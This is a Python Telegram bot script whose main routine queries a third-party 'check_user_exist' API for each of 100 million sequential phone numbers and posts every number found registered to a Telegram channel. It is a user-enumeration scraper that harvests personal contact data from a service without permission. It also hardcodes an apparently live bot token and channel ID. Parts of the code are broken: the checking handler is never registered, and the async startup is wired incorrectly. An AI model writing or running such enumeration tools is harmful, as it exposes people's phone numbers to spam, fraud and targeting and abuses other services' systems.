import os
import time
import logging
import asyncio
from telegram import Bot, ParseMode
from telegram.ext import Application, CommandHandler, MessageHandler, filters
from telegram import Update
from flask import Flask
from requests import get
from tqdm import tqdm

app = Flask(__name__)

# Replace with your bot's token and channel chat ID
TELEGRAM_BOT_TOKEN = '7193921126:AAFOJVvniqaxqFzePHfHlgK0I23Rwwx5sEw'
CHANNEL_ID = '-1002388515011'
bot = Bot(TELEGRAM_BOT_TOKEN)

# List to store the numbers and status (True/False)
numbers_to_check = [str(i) for i in range(9000000000, 9100000000)]
checked_numbers = []
total_numbers = len(numbers_to_check)

async def check_numbers(update: Update, context):
    # Send initial message with progress bar
    progress_message = await bot.send_message(
        chat_id=CHANNEL_ID,
        text=f"Checking Phone Numbers: 0/{total_numbers}\nLast checked: 9000000000\nTime left: Loading...",
    )

    start_time = time.time()

    for index, number in enumerate(numbers_to_check):
        # API request to check if the number exists
        response = get(f"https://isaclearningapi.akamai.net.in/get/check_user_exist?email_or_phone={number}")
        data = response.json()
        
        if data["status"] == 200 and data["data"]:
            # Send the phone number if found to the channel
            await bot.send_message(
                chat_id=CHANNEL_ID,
                text=f"Valid number found: {number}",
            )

        # Update progress bar every 10 seconds
        if index % 10 == 0:
            elapsed_time = time.time() - start_time
            time_left = (total_numbers - index) * (elapsed_time / (index + 1))
            minutes_left, seconds_left = divmod(time_left, 60)
            progress_text = f"Checking Phone Numbers: {index}/{total_numbers}\n" \
                            f"Last checked: {number}\n" \
                            f"Time left: {int(minutes_left)}:{int(seconds_left)}"
            await bot.edit_message_text(
                chat_id=CHANNEL_ID,
                message_id=progress_message.message_id,
                text=progress_text,
            )
        checked_numbers.append(number)

    await bot.edit_message_text(
        chat_id=CHANNEL_ID,
        message_id=progress_message.message_id,
        text=f"Check complete! All numbers have been processed.",
    )


async def start(update: Update, context):
    await update.message.reply_text("Bot started, checking numbers...")

async def stop(update: Update, context):
    await update.message.reply_text("Bot stopped.")

# Set up Telegram bot handlers
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("stop", stop))

    # Run the bot continuously
    application.run_polling(allowed_updates=Update.ALL)

# Flask route to check server health
@app.route('/health')
def health():
    return "OK", 200

if __name__ == "__main__":
    # Run Flask app and start the bot concurrently
    loop = asyncio.get_event_loop()
    loop.create_task(main())
    app.run(host="0.0.0.0", port=5000)
